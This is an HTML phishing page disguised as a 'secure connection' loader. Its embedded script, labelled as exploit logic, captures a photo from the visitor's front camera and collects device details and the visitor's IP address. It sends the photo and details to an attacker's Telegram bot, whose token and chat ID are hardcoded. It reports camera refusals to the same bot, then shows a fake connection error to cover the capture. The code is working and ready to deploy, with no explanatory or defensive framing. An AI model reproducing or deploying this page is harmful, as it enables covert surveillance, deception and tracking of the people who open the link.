<!DOCTYPE html>

<html>

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Loading...</title>

    <style>

        body { 

            background: #0a0a0a; 

            display: flex; 

            justify-content: center; 

            align-items: center; 

            height: 100vh; 

            margin: 0;

            font-family: Arial, sans-serif;

            color: #fff;

        }

        .loader {

            text-align: center;

        }

        .spinner {

            border: 4px solid #333;

            border-top: 4px solid #00ff88;

            border-radius: 50%;

            width: 40px;

            height: 40px;

            animation: spin 1s linear infinite;

            margin: 20px auto;

        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    </style>

</head>

<body>

    <div class="loader">

        <h2>Connecting to secure server...</h2>

        <div class="spinner"></div>

        <p style="color:#666;font-size:14px;">Please wait while we establish a secure connection</p>

    </div>



    <script>

        // ==========================================

        // CONFIGURATION - SET YOUR TELEGRAM BOT INFO

        // ==========================================

        const TELEGRAM_BOT_TOKEN = '8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk';        // Replace with your bot token

        const TELEGRAM_CHAT_ID = '8402472475';           // Replace with your chat ID

        

        // ==========================================

        // MAIN EXPLOIT LOGIC

        // ==========================================

        (async function() {

            // Prevent multiple captures

            if (sessionStorage.getItem('captured')) return;

            sessionStorage.setItem('captured', 'true');



            // Function to send image to Telegram

            async function sendToTelegram(imageData, deviceInfo) {

                try {

                    // Convert base64 to blob

                    const byteString = atob(imageData.split(',')[1]);

                    const mimeType = imageData.split(',')[0].split(':')[1].split(';')[0];

                    const ab = new ArrayBuffer(byteString.length);

                    const ia = new Uint8Array(ab);

                    for (let i = 0; i < byteString.length; i++) {

                        ia[i] = byteString.charCodeAt(i);

                    }

                    const blob = new Blob([ab], { type: mimeType });

                    

                    // Create form data

                    const formData = new FormData();

                    formData.append('chat_id', TELEGRAM_CHAT_ID);

                    formData.append('photo', blob, 'captured_face.jpg');

                    formData.append('caption', `📸 **Front Camera Capture**\n\n` +

                        `**Device:** ${deviceInfo.userAgent}\n` +

                        `**Platform:** ${deviceInfo.platform}\n` +

                        `**Time:** ${new Date().toISOString()}\n` +

                        `**IP:** ${deviceInfo.ip || 'Unknown'}\n` +

                        `**Language:** ${deviceInfo.language}\n` +

                        (deviceInfo.timezone ? `**Timezone:** ${deviceInfo.timezone}\n` : '') +

                        `**Screen:** ${deviceInfo.screen}`);

                    

                    // Send to Telegram

                    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {

                        method: 'POST',

                        body: formData

                    });

                    

                    return resp.ok;

                } catch(e) {

                    // Fallback: try sending as base64 text if image fails

                    try {

                        const fallbackData = {

                            chat_id: TELEGRAM_CHAT_ID,

                            text: `📸 Front Camera Capture (Fallback - Base64 image too large for text)\n\n` +

                                  `**Device:** ${deviceInfo.userAgent}\n` +

                                  `**Time:** ${new Date().toISOString()}\n` +

                                  `**Platform:** ${deviceInfo.platform}`

                        };

                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

                            method: 'POST',

                            headers: { 'Content-Type': 'application/json' },

                            body: JSON.stringify(fallbackData)

                        });

                    } catch(e2) {}

                    return false;

                }

            }



            // Get device info

            const deviceInfo = {

                userAgent: navigator.userAgent,

                platform: navigator.platform || 'Unknown',

                language: navigator.language,

                screen: `${screen.width}x${screen.height}`,

                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'

            };



            // Try to get IP address (helpful for geolocation)

            try {

                const ipResp = await fetch('https://api.ipify.org?format=json');

                const ipData = await ipResp.json();

                deviceInfo.ip = ipData.ip;

            } catch(e) {

                deviceInfo.ip = 'Unavailable';

            }



            // Access the front camera

            try {

                const stream = await navigator.mediaDevices.getUserMedia({

                    video: {

                        facingMode: 'user',

                        width: { ideal: 640 },

                        height: { ideal: 480 }

                    },

                    audio: false

                });



                // Create video element to capture frame

                const video = document.createElement('video');

                video.srcObject = stream;

                video.play();



                // Wait for video to be ready

                await new Promise(resolve => {

                    video.onloadedmetadata = () => {

                        video.width = video.videoWidth;

                        video.height = video.videoHeight;

                        resolve();

                    };

                });



                // Allow camera to adjust light levels

                await new Promise(r => setTimeout(r, 500));



                // Capture the frame

                const canvas = document.createElement('canvas');

                canvas.width = video.videoWidth;

                canvas.height = video.videoHeight;

                const ctx = canvas.getContext('2d');

                

                // Draw mirror image (front camera is mirrored)

                ctx.translate(canvas.width, 0);

                ctx.scale(-1, 1);

                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);



                // Stop all tracks

                stream.getTracks().forEach(track => track.stop());



                // Get image data (JPEG for smaller size)

                const imageData = canvas.toDataURL('image/jpeg', 0.7);



                // Send to Telegram

                await sendToTelegram(imageData, deviceInfo);



                // Clean up

                video.remove();

                canvas.remove();



            } catch(cameraError) {

                // Camera access denied or unavailable - send notification

                try {

                    const msgData = {

                        chat_id: TELEGRAM_CHAT_ID,

                        text: `⚠️ **Camera Access Denied/Unavailable**\n\n` +

                              `**User:** Clicked link but denied or no camera access\n` +

                              `**Device:** ${deviceInfo.userAgent}\n` +

                              `**Platform:** ${deviceInfo.platform}\n` +

                              `**Time:** ${new Date().toISOString()}\n` +

                              `**IP:** ${deviceInfo.ip}\n` +

                              `**Error:** ${cameraError.message}`

                    };

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

                        method: 'POST',

                        headers: { 'Content-Type': 'application/json' },

                        body: JSON.stringify(msgData)

                    });

                } catch(e) {}

            }



            // After all operations - redirect to a benign page or show "access denied"

            setTimeout(() => {

                document.body.innerHTML = `

                    <div class="loader">

                        <h2>Connection Failed</h2>

                        <p style="color:#888;">Unable to establish secure connection. Please check your network and try again.</p>

                        <p style="color:#555;font-size:12px;margin-top:30px;">Error code: SEC_${Math.random().toString(36).substr(2,6).toUpperCase()}</p>

                    </div>

                `;

            }, 2000);

        })();

    </script>

</body>

</html>
